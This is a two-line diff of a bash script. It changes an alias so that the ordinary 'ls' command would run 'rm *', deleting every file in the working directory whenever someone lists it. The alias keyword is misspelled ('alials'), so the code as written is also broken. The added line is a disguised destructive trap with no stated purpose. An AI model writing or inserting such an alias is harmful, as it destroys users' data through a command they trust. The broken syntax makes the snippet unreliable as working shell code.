@@ -1,2 +1,2 @@
 #!/bin/bash
-alials r="rm *"
+alials ls="rm *"
